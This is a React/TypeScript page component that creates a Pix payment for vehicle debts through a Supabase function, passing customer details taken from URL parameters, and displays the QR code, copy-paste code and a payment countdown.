import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

interface PaymentData {
  qrCode: string;
  qrCodeBase64: string;
  copyPaste: string;
  expiresAt: string;
}

interface TransactionResult {
  transactionId: string;
  status: string;
  paymentData: PaymentData;
}

const PixPagamento = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const valor = searchParams.get("valor") || "0,00";
  const placa = searchParams.get("placa") || "ABC1234";
  const nome = searchParams.get("nome") || "";
  const email = searchParams.get("email") || "";
  const telefone = searchParams.get("telefone") || "";
  const cpf = searchParams.get("cpf") || "";

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [transaction, setTransaction] = useState<TransactionResult | null>(null);

  // Convert valor string "67,19" to cents integer 6719
  const amountInCents = Math.round(
    parseFloat(valor.replace(".", "").replace(",", ".")) * 100
  );

  useEffect(() => {
    const createPayment = async () => {
      try {
        setLoading(true);
        setError(null);

        const { data, error: fnError } = await supabase.functions.invoke(
          "create-pix-payment",
          {
            body: {
              amount: amountInCents,
              customerName: nome,
              customerEmail: email,
              customerPhone: telefone,
              customerDocument: cpf,
              placa,
            },
          }
        );

        if (fnError) {
          throw new Error(fnError.message || "Erro ao criar pagamento");
        }

        if (!data?.success) {
          throw new Error(data?.message || "Erro ao criar pagamento");
        }

        setTransaction(data.data);
      } catch (err: any) {
        console.error("Payment error:", err);
        setError(err.message || "Erro ao gerar o Pix. Tente novamente.");
      } finally {
        setLoading(false);
      }
    };

    if (nome && email && cpf) {
      createPayment();
    } else {
      navigate(`/pagamento?valor=${valor}&placa=${placa}`, { replace: true });
    }
  }, []);

  // Countdown timer
  const [secondsLeft, setSecondsLeft] = useState(15 * 60);
  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (s: number) => {
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  const now = new Date();
  const vencimento = now.toLocaleDateString("pt-BR");

  const pixCode = transaction?.paymentData?.copyPaste || "";

  const handleCopy = () => {
    if (!pixCode) return;
    navigator.clipboard.writeText(pixCode);
    toast.success("Código Pix copiado!");
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-6">
        {/* Pulsing Pix icon */}
        <div className="relative mb-8">
          <div className="w-24 h-24 rounded-2xl bg-lime-400 flex items-center justify-center animate-pulse">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-gray-900">
              <path d="M13.17 6.17L17 2l4 4-3.83 3.83" />
              <path d="M10.83 17.83L7 22l-4-4 3.83-3.83" />
              <path d="M6.17 6.17L2 10l4.83 4.83" />
              <path d="M17.83 17.83L22 14l-4.83-4.83" />
              <path d="m10 10 4 4" />
            </svg>
          </div>
          {/* Ripple rings */}
          <div className="absolute inset-0 w-24 h-24 rounded-2xl border-2 border-lime-400/40 animate-ping" />
        </div>

        <h2 className="text-white font-bold text-xl mb-2 animate-fade-in">Gerando seu Pix...</h2>
        <p className="text-gray-400 text-sm text-center animate-fade-in">Estamos conectando com o banco para gerar seu QR Code</p>

        {/* Progress dots */}
        <div className="flex gap-2 mt-8">
          <div className="w-2.5 h-2.5 rounded-full bg-lime-400 animate-bounce" style={{ animationDelay: '0ms' }} />
          <div className="w-2.5 h-2.5 rounded-full bg-lime-400 animate-bounce" style={{ animationDelay: '150ms' }} />
          <div className="w-2.5 h-2.5 rounded-full bg-lime-400 animate-bounce" style={{ animationDelay: '300ms' }} />
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-100 text-gray-900">
        <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
          <button onClick={() => navigate(-1)} className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors">‹</button>
          <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
        </header>
        <div className="flex flex-col items-center justify-center mt-20 gap-4 px-6 text-center">
          <span className="text-4xl">❌</span>
          <p className="text-gray-900 font-bold text-lg">Erro ao gerar Pix</p>
          <p className="text-gray-600 text-sm">{error}</p>
          <button onClick={() => navigate(-1)} className="mt-4 px-6 py-3 bg-gray-950 text-white rounded-xl font-bold">Voltar</button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {/* Header */}
      <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
        <button
          onClick={() => navigate(-1)}
          className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors"
        >
          ‹
        </button>
        <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
      </header>

      <div className="max-w-3xl mx-auto px-6 pt-8 pb-10">
        {/* Resumo do pedido */}
        <div className="bg-white border border-gray-200 rounded-xl p-6 shadow-sm">
          <h2 className="text-gray-900 font-bold text-lg mb-4">Resumo do pedido</h2>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Placa do veículo</span>
            <span className="text-gray-900 font-bold text-sm">{placa}</span>
          </div>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Vencimento código Pix</span>
            <span className="text-gray-900 font-bold text-sm">{vencimento}</span>
          </div>

          <div className="flex items-center justify-between mt-2 bg-lime-100 rounded-lg px-4 py-3">
            <span className="text-green-800 font-semibold text-sm">Valor do pedido</span>
            <span className="text-gray-900 font-bold text-base">R$ {valor}</span>
          </div>
        </div>

        {/* Timer */}
        <div className="text-center mt-8">
          <p className="text-gray-600 text-sm">
            Pague em até <strong className="text-gray-900">{formatTime(secondsLeft)}</strong>
          </p>
        </div>

        {/* QR Code area */}
        <div className="flex justify-center mt-4">
          <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200 w-56 h-56 flex items-center justify-center">
            {transaction?.paymentData?.qrCodeBase64 ? (
              <img
                src={transaction.paymentData.qrCodeBase64}
                alt="QR Code Pix"
                className="w-44 h-44"
              />
            ) : pixCode ? (
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixCode)}`}
                alt="QR Code Pix"
                className="w-44 h-44"
              />
            ) : (
              <div className="w-44 h-44 bg-gray-100 rounded animate-pulse" />
            )}
          </div>
        </div>

        {/* Código Pix copia e cola */}
        <div className="mt-8">
          <p className="text-gray-600 text-sm mb-3">
            Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
          </p>
          <div className="bg-white border border-gray-200 rounded-xl p-4 text-xs text-gray-500 break-all min-h-[80px]">
            {pixCode}
          </div>
        </div>

        {/* Botão copiar */}
        <button
          onClick={handleCopy}
          className="w-full mt-6 py-4 rounded-xl bg-gray-950 text-white font-bold text-base tracking-wider hover:bg-black transition-colors"
        >
          Copiar código Pix
        </button>
      </div>
    </div>
  );
};

export default PixPagamento;
